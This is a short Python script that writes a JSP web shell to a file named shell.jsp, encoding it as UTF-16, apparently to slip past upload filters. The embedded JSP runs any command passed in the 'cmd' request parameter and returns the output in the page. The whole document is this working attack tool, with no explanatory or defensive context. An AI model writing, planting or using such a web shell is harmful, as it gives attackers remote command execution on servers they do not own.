filedata = '''
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
InputStream in =
Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
ByteArrayOutputStream baos = new ByteArrayOutputStream();
byte[] b = new byte[1024];
int a = -1;
while ((a = in.read(b)) != -1) {
baos.write(b, 0, a);
}
out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
%>
'''.encode("UTF-16")
with open("shell.jsp", 'wb') as f:
    f.write(filedata)